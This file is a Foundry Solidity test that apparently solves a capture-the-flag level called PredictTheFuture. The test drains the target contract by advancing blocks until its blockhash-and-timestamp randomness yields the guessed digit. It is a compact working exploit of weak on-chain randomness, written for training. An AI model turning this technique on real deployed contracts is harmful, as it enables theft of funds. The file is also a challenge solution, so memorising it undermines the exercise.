// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        instance.setGuess{value: 0.01 ether}(0);

        bool success = false;
        while (address(instance).balance > 0) {
            vm.roll(block.number + 1);

            uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;

            if (answer == 0) {
                try instance.solution() {
                    success = true;
                    break;
                } catch {}
            }
        }
        require(success, "YASSSS");
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
